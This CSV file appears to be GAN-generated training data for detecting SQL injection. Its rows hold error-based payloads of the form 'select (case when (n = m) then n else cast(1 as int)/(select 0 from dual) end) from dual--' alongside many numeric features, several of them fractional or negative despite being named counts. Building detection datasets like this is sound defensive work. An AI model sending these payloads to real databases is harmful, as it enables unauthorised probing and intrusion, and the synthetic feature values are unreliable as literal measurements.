id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000982,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000021,1.1918470769099756,133.16021728515625,56.055328369140625,13.565585136413574,51.36502456665039,-1.546294093132019,54.4805793762207,12.054405212402344,1.0229114294052124,0.4274367392063141,0.1076212227344513,0.3815804421901703,0.09148775041103363,3.7778656482696533,-0.18571807444095612,-0.05025973916053772,1.9694170951843262,0.021399088203907013,0.9663858413696289,-0.05913392826914787,3.9629838466644287,3.7821261882781982,0.16898085176944733,-0.11544802039861679,1.100131630897522,-0.02829078957438469,0.11997772753238678,0.049824029207229614,-0.06194104626774788,0.004261855036020279,0.014346867799758911,0.14655664563179016,0.10322687029838562,-0.0606452114880085,0.9726904630661011,1.0111278295516968,2.811687707901001,0.02271108888089657,1.9552236795425415,-0.0240929052233696,0.02766493335366249,1.9690642356872559,-0.18832159042358398,-0.1243167296051979,0.07896500825881958,-0.11198530346155167,-0.04497132450342178,0.9977105855941772,0.9112231731414795,1.0872424840927124,0.9791392087936401,0.9059369564056396,0.18731237947940826,0.2965236008167267,0.12120319902896881,-0.08000978827476501,-0.032813768833875656,-0.05253417417407036,0.02630559355020523,0.029889041557908058,0.0025657080113887787,-0.009159773588180542,0.024211786687374115,-0.16582998633384705,0.9839804172515869,-0.22679737210273743,-0.18378430604934692,-0.06905609369277954,0.14109480381011963,-0.03953278437256813,-0.11698734760284424,-0.03454970568418503,-0.13534028828144073,0.09512990713119507,-0.06641840934753418,0.008131506852805614,-0.21018283069133759,0.15886631608009338,0.15613006055355072,0.06559907644987106,-0.14025217294692993,10.367242813110352,0.028068145737051964,-0.09356307983398438,0.19664742052555084,-0.01307382807135582,-0.20322546362876892,-0.0982777327299118,0.1326940506696701
GAN_000983,attack,error,select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000016,1.7609269742961218,131.78323364257812,55.63547134399414,12.980550765991211,52.07529067993164,-1.5656651258468628,56.459617614746094,11.625229835510254,0.9942979216575623,0.4267893135547638,0.10286761820316315,0.3803246021270752,0.08838110417127609,3.6920764446258545,-0.37639036774635315,0.13725368678569794,1.9596177339553833,0.18080458045005798,0.9475979804992676,-0.03769650682806969,4.28145694732666,3.9041130542755127,0.08431855589151382,-0.0445755273103714,1.1166865825653076,-0.26922324299812317,0.14177069067955017,-0.02302173338830471,0.01566128060221672,0.21746419370174408,0.0202295184135437,0.09465819597244263,-0.034379810094833374,0.07265765964984894,1.0392907857894897,1.0844279527664185,2.9855446815490723,0.04280522093176842,2.047912120819092,-0.145282581448555,0.01343031320720911,1.9693782329559326,-0.19968679547309875,0.08530982583761215,-0.02814667299389839,-0.1620529294013977,0.11431815475225449,1.001016616821289,1.0178457498550415,1.0668503046035767,1.0013426542282104,0.9344128966331482,0.16515479981899261,0.03610400855541229,-0.047599829733371735,-0.2422046661376953,-0.082576684653759,-0.08685554563999176,0.13631567358970642,-0.22496899962425232,-0.0628010481595993,-0.13648857176303864,-0.06170443072915077,0.04213365912437439,1.0597463846206665,-0.1168808862566948,-0.16175809502601624,-0.17165277898311615,-0.028556041419506073,0.2569252550601959,-0.3638700842857361,-0.06827329844236374,0.00116005539894104,0.3233577311038971,0.04007984325289726,-0.05645366013050079,-0.39849865436553955,0.08743328601121902,0.17908895015716553,-0.13652724027633667,0.13627642393112183,10.85315227508545,-0.18372157216072083,-0.23199774324893951,0.1863439679145813,0.1420285850763321,-0.5134044289588928,-0.2151779979467392,-0.01589016616344452
GAN_000984,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000021,1.3888902390799,132.3381805419922,55.89088821411133,12.905315399169922,51.17877960205078,1.3660062551498413,53.77281188964844,11.937246322631836,1.0649056434631348,0.43155425786972046,0.10282867401838303,0.3757747411727905,0.09199702739715576,3.7927587032318115,-0.16125424206256866,-0.06316541880369186,1.8104584217071533,-0.01998666301369667,0.9552258849143982,0.024501804262399673,3.999051570892334,3.7850637435913086,-0.052011556923389435,-0.12879428267478943,1.1198573112487793,0.07257813215255737,0.11829832196235657,-0.09976515173912048,-0.015399625524878502,0.0834721103310585,0.0969705879688263,0.1909000277519226,0.17368540167808533,-0.02518339827656746,0.9674925208091736,1.1133346557617188,2.8132901191711426,0.056276384741067886,1.976318120956421,-0.012975126504898071,0.014863873831927776,1.9417479038238525,-0.14899462461471558,-0.05754996836185455,0.08662573993206024,-0.025569476187229156,0.034470271319150925,0.8976023197174072,0.8915613889694214,0.9605234861373901,0.9308361411094666,0.892973780632019,0.12590302526950836,0.017544874921441078,0.018412739038467407,-0.20314545929431915,-0.10909043997526169,-0.13431505858898163,-0.0766630470752716,-0.22915518283843994,-0.1317175328731537,-0.09056296944618225,-0.016209259629249573,-0.07608075439929962,1.0102903842926025,-0.11481643468141556,-0.039793841540813446,0.06992146372795105,0.07954567670822144,0.021621286869049072,-0.26980745792388916,-0.2614409327507019,-0.13620707392692566,0.13680924475193024,0.08793772757053375,-0.002813405357301235,-0.09370913356542587,0.123072549700737,-0.008362450636923313,-0.1368512213230133,0.2311321198940277,10.56135082244873,-0.017552146688103676,-0.05955400690436363,0.11899295449256897,0.10838134586811066,-0.12744516134262085,-0.21340343356132507,0.03337199240922928
GAN_000985,attack,error,select   (  case when   (  8403  =  7151  )   then 8403 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000007,1.7675271170952405,133.71429443359375,55.86735153198242,14.179804801940918,53.518157958984375,-2.6096339225769043,56.98990249633789,11.751023292541504,0.9603050351142883,0.41756728291511536,0.11539174616336823,0.38089483976364136,0.08939675986766815,3.7558653354644775,-0.3865843117237091,-0.008559968322515488,1.8957957029342651,0.1549721360206604,0.9807056188583374,-0.10269508510828018,4.204895973205566,3.719247341156006,0.11808672547340393,-0.14253516495227814,1.065758466720581,-0.20231826603412628,0.04107826203107834,0.1290275752544403,-0.08618294447660446,0.0026203435845673084,0.05066452547907829,0.22821837663650513,-0.1031292974948883,0.09432670474052429,1.0267595052719116,1.0298171043395996,2.8107385635375977,0.042097631841897964,1.9567511081695557,-0.011954247951507568,-0.00464314129203558,2.0574839115142822,-0.2000470906496048,-0.24871593713760376,0.21596424281597137,-0.02342252805829048,0.038112953305244446,0.9956330060958862,0.9395341277122498,1.1312499046325684,1.031167984008789,0.8957955241203308,0.15268433094024658,0.24353046715259552,0.04752206802368164,-0.19592256844043732,-0.02239728346467018,-0.04809555038809776,-0.09347060322761536,-0.24406041204929352,0.08357875794172287,-0.1707579642534256,0.02536173164844513,-0.17019347846508026,1.127309799194336,-0.11604204773902893,-0.20653820037841797,-0.011077828705310822,0.28125524520874023,0.2182842195034027,-0.43991127610206604,0.03266587853431702,-0.058568328619003296,0.2209545373916626,-0.11534614861011505,-0.027035148814320564,-0.2650541663169861,0.044506676495075226,0.20486339926719666,-0.11026383936405182,0.10477318614721298,11.118743896484375,-0.10801797360181808,0.00891866534948349,0.13881996273994446,0.04542684555053711,-0.30036962032318115,-0.062471650540828705,0.08626806735992432
GAN_000986,attack,error,select   (  case when   (  1812  =  2446  )   then 1812 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000022,1.8508269223054705,130.81761169433594,55.70579528808594,13.481993675231934,51.80488967895508,-2.3831868171691895,57.68781280517578,11.476445198059082,1.0342496633529663,0.4312499463558197,0.10751135647296906,0.38089320063591003,0.08405441790819168,3.7166147232055664,-0.327052503824234,0.011296123266220093,1.9776110649108887,0.1988253891468048,1.0166200399398804,-0.05640159919857979,4.33685302734375,3.8587162494659424,0.14173643290996552,-0.06803426146507263,1.1086982488632202,-0.05121771991252899,0.17406612634658813,-0.14847125113010406,-0.113767609000206,0.21967241168022156,0.034817103296518326,0.24671316146850586,0.03117271512746811,0.15221288800239563,1.0163971185684204,1.0120868682861328,2.8937036991119385,0.08053857833147049,1.989101529121399,-0.13393855094909668,0.029787259176373482,2.086106061935425,-0.12375814467668533,0.012427665293216705,0.03499544784426689,-0.07168752700090408,0.010317418724298477,0.9572116136550903,0.9957842826843262,1.0797580480575562,1.075490117073059,0.8856427073478699,0.19396498799324036,-0.007904306054115295,-0.08825572580099106,-0.1952345073223114,-0.05960172414779663,-0.19781653583049774,0.030105305835604668,-0.21590857207775116,-0.19259974360466003,-0.06078328192234039,0.07003860175609589,0.11198689043521881,1.061207890510559,-0.06003295257687569,-0.1846468299627304,0.09985648095607758,0.180117666721344,0.20593740046024323,-0.3294731676578522,-0.22702564299106598,0.07852499186992645,0.32670530676841736,-0.1517736166715622,-0.03146938234567642,-0.3077825903892517,0.07448709011077881,0.324053019285202,0.0008306726813316345,0.16474315524101257,11.307023048400879,-0.09074749797582626,-0.2634429931640625,0.1798224300146103,0.054736748337745667,-0.19400285184383392,-0.03152201697230339,0.26155775785446167
GAN_000987,attack,error,select   (  case when   (  8403  =  7151  )   then 8403 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000007,1.7772724794421744,131.24365234375,55.67827224731445,13.426998138427734,53.093265533447266,-1.0439242124557495,56.753456115722656,11.654278755187988,0.9702389240264893,0.42611774802207947,0.11055918782949448,0.37839940190315247,0.08984614908695221,3.7518794536590576,-0.26901230216026306,0.09788843989372253,1.8755584955215454,0.18053200840950012,0.9436166286468506,-0.1114862933754921,4.317060470581055,3.8248093128204346,-0.04553568363189697,0.01888924464583397,1.0695077180862427,-0.04251433163881302,0.19916144013404846,0.1085868701338768,-0.0929560735821724,0.03551100194454193,0.055772989988327026,0.1667446494102478,-0.13530859351158142,0.08542962372303009,1.0402376651763916,0.9990222454071045,2.873051166534424,0.09826986491680145,1.9327993392944336,-0.019846167415380478,0.031182439997792244,2.085418701171875,-0.1714291125535965,-0.13109400868415833,0.08408898115158081,-0.07847493141889572,0.012400834821164608,0.9393959641456604,0.9056347012519836,1.1150381565093994,0.9953289031982422,0.8765588998794556,0.14016428589820862,0.08006756007671356,-0.032440200448036194,-0.17545869946479797,0.1395532637834549,-0.05109192058444023,-0.1842852234840393,-0.18409264087677002,0.09288989752531052,-0.11409443616867065,0.12564481794834137,0.07258825749158859,1.0464253425598145,-0.06575975567102432,-0.12288810312747955,0.14959464967250824,0.16062262654304504,0.2129361927509308,-0.41375160217285156,0.011881976388394833,0.10953156650066376,0.4034339189529419,-0.154594287276268,-0.039498470723629,-0.3499641418457031,0.003472164273262024,0.14887206256389618,-0.1937180459499359,0.16834163665771484,10.968843460083008,-0.08337198942899704,-0.15020820498466492,0.23677924275398254,0.04710058867931366,-0.308889776468277,-0.03157941251993179,0.27243226766586304
GAN_000988,attack,error,select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000015,1.4148609866955257,132.78135681152344,56.13204574584961,13.788535118103027,52.762413024902344,0.4209464192390442,54.510292053222656,11.894723892211914,1.1799671649932861,0.42539235949516296,0.10646660625934601,0.3749791085720062,0.08923381567001343,3.7732491493225098,-0.1855883151292801,-0.15318144857883453,1.9186482429504395,0.029986225068569183,1.0014063119888306,0.005736395251005888,4.098633289337158,3.8981239795684814,-0.014188699424266815,-0.10770642012357712,1.0764844417572021,0.044405270367860794,0.13167929649353027,-0.04605274647474289,-0.21356871724128723,0.14943525195121765,0.052586283534765244,0.16962291300296783,-0.03367944061756134,0.22919286787509918,1.0189546346664429,1.0613148212432861,2.904970645904541,0.043051037937402725,2.0012052059173584,-0.06802413612604141,0.021824950352311134,1.9477711915969849,-0.08605770766735077,-0.08734548836946487,0.18432915210723877,-0.00793126504868269,-0.06970906257629395,0.9361430406570435,0.8856496810913086,1.0010526180267334,1.0125916004180908,0.9232001304626465,0.17225632071495056,0.028557339683175087,-0.05243212729692459,-0.3612041175365448,0.08810769021511078,-0.22355176508426666,-0.04576627165079117,-0.17566730082035065,-0.09426893293857574,-0.2055126428604126,-0.04454701393842697,-0.08821254223585129,1.0634937286376953,-0.06579291820526123,-0.07609943300485611,0.07309579849243164,0.1273365467786789,0.14373695850372314,-0.29130515456199646,-0.19340287148952484,-0.08380516618490219,0.1743750125169754,-0.08141645789146423,-0.018905727192759514,-0.22816143929958344,0.07831938564777374,0.1288783699274063,-0.09967771172523499,0.16166794300079346,10.901898384094238,-0.08401823788881302,-0.07782712578773499,0.08248596638441086,-0.0865868479013443,-0.07768451422452927,-0.06343995779752731,0.19528719782829285
GAN_000989,attack,error,select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000014,1.6885149207161976,133.24887084960938,56.04600143432617,12.7239990234375,51.98710632324219,-1.1575864553451538,55.69717788696289,11.760882377624512,1.208271861076355,0.4338907301425934,0.1129150241613388,0.3798524737358093,0.09090577065944672,3.747838258743286,-0.427141398191452,-0.04742981493473053,1.916502833366394,0.16555127501487732,0.9570143818855286,0.1600579172372818,4.057650089263916,3.807003974914551,0.11291734129190445,-0.44755828380584717,1.0718228816986084,-0.2444399893283844,0.05144275724887848,-0.1462443768978119,-0.13586577773094177,-0.08538540452718735,0.08067870140075684,0.042137015610933304,0.011039607226848602,-0.11298084259033203,1.014115571975708,1.022382378578186,2.794309139251709,0.04342692717909813,1.9591078758239746,-0.03295920044183731,0.007110343314707279,1.9925873279571533,-0.21046259999275208,0.1381879448890686,-0.029665855690836906,-0.17499218881130219,0.1323733925819397,0.949964702129364,0.9338736534118652,1.1018075942993164,0.9848566055297852,0.8927545547485352,0.08497406542301178,0.2327786087989807,0.016358591616153717,-0.23475317656993866,-0.02395043894648552,-0.1358017921447754,-0.13593034446239471,-0.2727249264717102,-0.08129672706127167,-0.21427902579307556,-0.137065589427948,-0.041893262416124344,0.9974811673164368,-0.05727750062942505,0.05640055611729622,-0.20987914502620697,0.2307741940021515,0.09152902662754059,-0.468220591545105,-0.16667914390563965,-0.04709412902593613,0.035759806632995605,0.04461590573191643,-0.028778301551938057,-0.35702162981033325,0.14999812841415405,0.004925765097141266,-0.044999390840530396,-0.12355033308267593,10.887760162353516,-0.0313616506755352,-0.19959081709384918,0.34175747632980347,-0.07342453300952911,-0.13719718158245087,-0.09002400934696198,-0.11881561577320099
GAN_000990,attack,error,select   (  case when   (  4415  =  2051  )   then 4415 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000027,1.6654092753982621,132.76544189453125,55.66305160522461,14.269983291625977,53.05302429199219,-0.2169899344444275,58.51751708984375,11.672822952270508,1.12190842628479,0.43199464678764343,0.11098956316709518,0.3829135298728943,0.08641637861728668,3.698474168777466,-0.2518406808376312,0.06206897273659706,2.039346218109131,0.11825863271951675,1.0026957988739014,0.2184203565120697,4.263240814208984,3.9101319313049316,0.10925392806529999,-0.13774517178535461,1.0751861333847046,-0.08667293936014175,0.010211106389760971,-0.09523208439350128,-0.1734069585800171,0.1469872146844864,0.10120972245931625,0.13962601125240326,-0.06337344646453857,0.09212243556976318,1.0238420963287354,1.0944874286651611,2.8330774307250977,0.029015516862273216,1.9469252824783325,-0.039246827363967896,0.023854780942201614,2.024082899093628,-0.039001498371362686,-0.09392692893743515,0.13503581285476685,-0.26638084650039673,-0.03085554949939251,0.9439293742179871,0.9486013650894165,1.0588425397872925,1.0261211395263672,0.9546279907226562,0.05843622609972954,0.0482393279671669,-0.055203877389431,-0.24186979234218597,-0.1490834653377533,-0.010129895061254501,-0.07664746046066284,-0.30329009890556335,-0.029397591948509216,-0.07263360917568207,-0.13784658908843994,-0.06461150199174881,1.101012110710144,-0.12746940553188324,-0.07596474140882492,-0.08875325322151184,0.0661483183503151,0.25442132353782654,-0.38431039452552795,-0.15904611349105835,-0.04498245567083359,0.17134730517864227,-0.002037040889263153,-0.03350480645895004,-0.3315810561180115,0.07130834460258484,0.1433364450931549,-0.02163061499595642,0.20285958051681519,11.037313461303711,-0.12783020734786987,-0.15181833505630493,0.35015854239463806,0.1100139319896698,-0.10641175508499146,-0.18207819759845734,0.1418161392211914
GAN_000991,attack,error,select   (  case when   (  5704  =  4125  )   then 5704 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000025,1.402444874483644,131.27537536621094,55.80891799926758,12.652228355407715,51.19292068481445,-0.9735869765281677,56.26980209350586,11.667943000793457,0.7642775774002075,0.42774391174316406,0.11036743223667145,0.38063862919807434,0.0914793387055397,3.732099771499634,-0.36955782771110535,0.07370083034038544,1.9827044010162354,0.14836087822914124,0.9697040915489197,-0.02900269627571106,4.133543491363525,3.859727621078491,0.07491911202669144,-0.03272943198680878,1.186715006828308,-0.12088912725448608,0.06589634716510773,0.10319949686527252,0.008724380284547806,-0.11081430315971375,0.09618056565523148,0.04682624712586403,0.12253101915121078,-0.017713524401187897,1.0283641815185547,1.0944567918777466,2.9322140216827393,0.056551944464445114,1.9294793605804443,-0.10942487418651581,-0.0037804534658789635,2.0134966373443604,-0.2020125389099121,-0.030570946633815765,-0.09723636507987976,-0.10342590510845184,0.056478552520275116,0.9679260849952698,1.0271553993225098,1.0374422073364258,1.0187177658081055,0.95088130235672,0.07806046307086945,0.028180455788969994,0.12700454890727997,-0.1726817637681961,-0.0957849770784378,0.04211914539337158,-0.07321710884571075,-0.24315409362316132,-0.020642563700675964,-0.16281965374946594,0.11904975771903992,-0.09480434656143188,1.0211025476455688,-0.11417259275913239,0.04077770933508873,-0.027701720595359802,0.07450524717569351,0.208118736743927,-0.342237651348114,-0.046965014189481735,-0.01862792856991291,0.1848457157611847,0.006188847124576569,-0.014664138667285442,-0.08921577781438828,-0.020359419286251068,0.16495957970619202,0.054242417216300964,0.03414386138319969,10.819395065307617,-0.10638367384672165,-0.10856904834508896,0.25760987401008606,0.11860108375549316,-0.35399767756462097,0.00994902290403843,-0.06239555776119232
GAN_000992,attack,error,select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000016,2.1108391602530605,132.94854736328125,55.46416473388672,13.63098430633545,52.8554801940918,-3.934817314147949,57.77104949951172,11.478906631469727,1.0660585165023804,0.4227912127971649,0.11602877825498581,0.3777388036251068,0.0874856486916542,3.6922223567962646,-0.358938604593277,-0.0361112542450428,1.9017211198806763,0.03395015746355057,1.038673996925354,-0.18243972957134247,4.261482238769531,3.6830692291259766,0.1614508032798767,0.06335264444351196,0.9994107484817505,-0.22513681650161743,0.038805365562438965,0.19419947266578674,-0.06706341356039047,-0.038141585886478424,-0.10389914363622665,0.26428288221359253,-0.07332324981689453,0.13632617890834808,1.0205327272415161,1.095858097076416,2.9202990531921387,0.04607679322361946,1.9724911451339722,-0.051365140825510025,0.0014442717656493187,2.0721590518951416,-0.05646417662501335,-0.09005629271268845,-0.011136595159769058,0.16518528759479523,0.1999499499797821,0.9963203072547913,0.9821396470069885,1.1289863586425781,1.0756618976593018,0.8667214512825012,0.20821937918663025,-0.06068523973226547,-0.06088464707136154,-0.25678563117980957,-0.029719702899456024,-0.010080929845571518,-0.09557238221168518,-0.023424074053764343,0.0297507643699646,-0.02884737402200699,-0.02684231474995613,-0.06348240375518799,1.101188063621521,-0.08949973434209824,-0.19857089221477509,-0.015371672809123993,0.1423756182193756,0.3248283267021179,-0.4164172410964966,-0.09039440006017685,0.031166035681962967,0.4139648377895355,0.0023334771394729614,-0.042842425405979156,-0.5050109624862671,0.03824171423912048,0.1922648549079895,-0.08809903264045715,0.1772291362285614,11.320998191833496,-0.16661709547042847,-0.24388957023620605,0.19392620027065277,0.16920743882656097,-0.49067747592926025,-0.1692163646221161,0.3036715090274811
GAN_000993,attack,error,select   (  case when   (  9103  =  9836  )   then 9103 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000031,1.5588805654206994,133.32452392578125,55.94707489013672,13.462193489074707,51.625282287597656,-1.6456431150436401,56.92206573486328,11.874146461486816,1.1596566438674927,0.42539459466934204,0.11372100561857224,0.3764561414718628,0.08704502135515213,3.7256598472595215,-0.30600371956825256,-0.1539648026227951,2.055969476699829,0.027642540633678436,0.9822364449501038,0.004055958706885576,4.082640647888184,3.83479642868042,0.06414420902729034,-0.274084210395813,1.124131202697754,-0.10032854974269867,-0.0026437826454639435,0.1833380162715912,-0.26583364605903625,-0.10682722181081772,0.08230692893266678,0.1407395452260971,0.01466912031173706,0.15930511057376862,0.9960730671882629,1.0360249280929565,2.899970769882202,0.08608997613191605,1.9841786623001099,0.054263886064291,0.0029151448979973793,2.027785539627075,-0.10713449865579605,-0.05896171182394028,0.05813506618142128,0.02952033467590809,-0.01930188201367855,0.9807435274124146,0.9760507941246033,1.0999188423156738,1.0301427841186523,0.9331644773483276,0.2507975101470947,0.01186799630522728,0.0986509919166565,-0.3475313186645508,-0.04636047035455704,-0.12008343636989594,-0.07411675155162811,-0.1920914500951767,0.07056748121976852,-0.13782896101474762,-0.04775343835353851,-0.22079238295555115,0.9671064615249634,-0.2630700469017029,-0.0668821707367897,-0.05933500826358795,0.08146366477012634,0.18684695661067963,-0.2739677429199219,-0.10564737021923065,0.09648974239826202,0.017192523926496506,-0.11010956764221191,-0.041538506746292114,-0.3559311032295227,-0.1697952151298523,0.11537867039442062,0.13115903735160828,-0.06357131898403168,10.791776657104492,-0.12944743037223816,-0.2405264973640442,0.27437150478363037,0.08652086555957794,-0.19852948188781738,-0.048992738127708435,0.16744504868984222
GAN_000994,attack,error,select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000015,2.3821208043672337,132.63864135742188,55.48870086669922,14.75037956237793,55.03305435180664,-3.179135799407959,55.51409912109375,11.606083869934082,1.0181159973144531,0.423434317111969,0.11832456290721893,0.3835749328136444,0.08650331944227219,3.7679708003997803,-0.5956319570541382,0.03710507974028587,2.1879477500915527,0.2904781401157379,1.0397886037826538,-0.16678644716739655,4.411248207092285,4.039953708648682,-0.022307850420475006,-0.12413875013589859,0.9843304753303528,0.1470811814069748,0.3437134921550751,0.10782430320978165,-0.08563397824764252,0.11427121609449387,0.13749969005584717,0.15870000422000885,-0.1639648675918579,-0.08249254524707794,1.0950696468353271,0.9755188226699829,2.927677869796753,0.03126618638634682,2.069270133972168,-0.04179327189922333,0.04334524646401405,2.0742180347442627,-0.20376083254814148,-0.19279900193214417,0.3331593871116638,-0.3499106764793396,-0.012189177796244621,1.013047695159912,0.9119449853897095,1.208001971244812,1.0381866693496704,0.9374287128448486,0.2913534343242645,0.17402301728725433,0.0026977509260177612,-0.3145601749420166,0.1315547078847885,-0.2295297235250473,-0.1791057586669922,-0.3600020408630371,0.047617264091968536,-0.058381929993629456,-0.005805030465126038,0.16664662957191467,1.1909565925598145,-0.1308690905570984,-0.0909539982676506,-0.15439879894256592,0.1451592594385147,0.020460769534111023,-0.32928958535194397,-0.24963484704494476,-0.06837013363838196,0.4592697024345398,-0.039357639849185944,-0.02073940448462963,-0.4362999200820923,0.22189822793006897,0.10311241447925568,-0.16833356022834778,-0.24419566988945007,11.493170738220215,-0.13037091493606567,-0.04691045731306076,0.30209237337112427,-0.20761094987392426,0.03517019748687744,-0.1652529388666153,0.274270236492157
GAN_000995,attack,error,select   (  case when   (  9667  =  6212  )   then 9667 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000009,1.9958747859103814,132.2022247314453,55.529537200927734,14.471688270568848,53.51763916015625,-3.9418249130249023,57.2202033996582,11.598747253417969,0.9754599332809448,0.4186006784439087,0.11181510984897614,0.3814132511615753,0.08658196777105331,3.722424030303955,-0.5630185604095459,0.009796138852834702,1.89176607131958,0.06641175597906113,0.9947288036346436,-0.07365929335355759,4.202500820159912,3.7239439487457275,0.10647571831941605,-0.01207122765481472,1.05235755443573,-0.11208748817443848,0.08670557290315628,0.02645234577357769,-0.022631341591477394,-0.019755879417061806,-0.08339562267065048,0.32557857036590576,0.08702390640974045,0.06516429036855698,0.9911640286445618,1.0631810426712036,2.8523097038269043,0.04287919029593468,1.9954363107681274,-0.0711512640118599,-0.014014448039233685,2.0741217136383057,-0.15537957847118378,-0.07695459574460983,0.06935669481754303,0.12188412249088287,0.1863875538110733,0.978003740310669,1.00733482837677,1.082186222076416,1.0608341693878174,0.8653318881988525,0.2514888644218445,0.07263212651014328,-0.03245207667350769,-0.23395799100399017,-0.02343035861849785,-0.09261271357536316,-0.22391942143440247,-0.05078484117984772,-0.005734682083129883,-0.2747957110404968,0.13745369017124176,-0.13686461746692657,1.1260801553726196,0.08939585089683533,-0.235541433095932,0.10031000524759293,0.337240993976593,0.33951231837272644,-0.4110769033432007,-0.12171966582536697,-0.07958891987800598,0.3234550356864929,-0.14937344193458557,-0.03130107372999191,-0.3234965205192566,0.07243597507476807,0.18590450286865234,-0.021569885313510895,0.11016395688056946,11.180625915527344,-0.13774177432060242,-0.16523981094360352,0.23702752590179443,0.12119963765144348,-0.5151234269142151,-0.1837405562400818,0.11672894656658173
